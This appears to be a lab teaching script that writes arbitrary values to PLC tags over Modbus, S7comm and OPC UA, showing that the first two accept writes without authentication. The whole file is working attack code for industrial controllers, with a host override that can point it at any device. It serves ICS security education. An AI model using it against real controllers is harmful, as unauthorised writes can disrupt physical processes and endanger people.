#!/usr/bin/env python3
"""
attack.py — One attack, three protocols.

The same logical operation ("write value V to tag T on PLC P") gets
re-expressed in Modbus, S7comm, and OPC UA. The student runs this
three times (once per protocol) and observes:
  - Modbus and S7 always succeed (zero auth)
  - OPC UA succeeds with SecurityPolicy=None, fails after up.sh

Usage:
    ./attack.py --protocol modbus --tag 100 --value 42
    ./attack.py --protocol s7     --tag 0   --value 9999
    ./attack.py --protocol opcua  --tag P1_TIT01_temperature_1 --value 99.9
"""
import argparse
import socket
import struct
import sys


def attack_modbus(host: str, port: int, register: int, value: int) -> None:
    from pymodbus.client import ModbusTcpClient

    c = ModbusTcpClient(host=host, port=port)
    if not c.connect():
        print(f"[modbus] connect to {host}:{port} failed", file=sys.stderr)
        sys.exit(1)

    print(f"[modbus] writing register {register} = {value}")
    rr = c.write_register(address=register, value=value, slave=1)
    if rr.isError():
        print(f"[modbus] write FAILED: {rr}", file=sys.stderr)
        sys.exit(2)
    print("[modbus] write OK (no auth required)")
    c.close()


def attack_s7(host: str, db_offset: int, value: int) -> None:
    import snap7

    ip = socket.gethostbyname(host)         # libsnap7 doesn't resolve names
    c = snap7.client.Client()
    c.connect(ip, 0, 1)
    if not c.get_connected():
        print(f"[s7] connect to {host} ({ip}) failed", file=sys.stderr)
        sys.exit(1)

    # Recon: read 2 bytes at the target offset so the pcap contains
    # both Read Var (FC=0x04) and Write Var (FC=0x05) frames for the
    # §1.2 decode exercise.
    before = c.db_read(1, db_offset, 2)
    print(f"[s7] read DB1.DBW{db_offset} = {int.from_bytes(before, 'big')} ({before.hex()})")

    payload = struct.pack(">H", value & 0xFFFF)    # big-endian INT
    print(f"[s7] writing DB1.DBW{db_offset} = {value} ({payload.hex()})")
    c.db_write(1, db_offset, payload)
    print("[s7] write OK (no auth required)")
    c.disconnect()


def attack_opcua(url: str, node_browse: str, value: float) -> None:
    import asyncio
    from asyncua import Client

    async def _run():
        async with Client(url=url, timeout=4) as client:
            ns_idx = await client.get_namespace_index("http://lab.diode/plc")
            # Server uses string NodeIds: ns=<idx>;s=<tag-name>
            node = client.get_node(f"ns={ns_idx};s={node_browse}")
            print(f"[opcua] writing {node_browse} = {value}")
            await node.write_value(float(value))
            print("[opcua] write OK")

    try:
        asyncio.run(_run())
    except Exception as e:
        # Surface security policy failures clearly — that's the §2.3 lesson.
        msg = str(e)
        print(f"[opcua] write FAILED: {type(e).__name__}: {msg}", file=sys.stderr)
        if "BadSecurityChecksFailed" in msg or "SecurityCheck" in msg:
            print("[opcua] → server rejected the unauthenticated session.",
                  file=sys.stderr)
            print("[opcua] → this is the protocol stopping you, not the network.",
                  file=sys.stderr)
        sys.exit(3)


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--protocol", required=True,
                    choices=["modbus", "s7", "opcua"])
    ap.add_argument("--tag", required=True,
                    help="Modbus register number / S7 DB1 byte offset / OPC UA browse name")
    ap.add_argument("--value", required=True,
                    help="Modbus/S7: integer 0-65535. OPC UA: float.")
    ap.add_argument("--host", default=None,
                    help="Override default PLC hostname for the chosen protocol.")
    args = ap.parse_args()

    if args.protocol == "modbus":
        host = args.host or "plc-modbus"
        attack_modbus(host, 502, int(args.tag), int(args.value))
    elif args.protocol == "s7":
        host = args.host or "plc-s7"
        attack_s7(host, int(args.tag), int(args.value))
    elif args.protocol == "opcua":
        host = args.host or "plc-opcua"
        url = f"opc.tcp://{host}:4840/lab/"
        attack_opcua(url, args.tag, float(args.value))


if __name__ == "__main__":
    main()
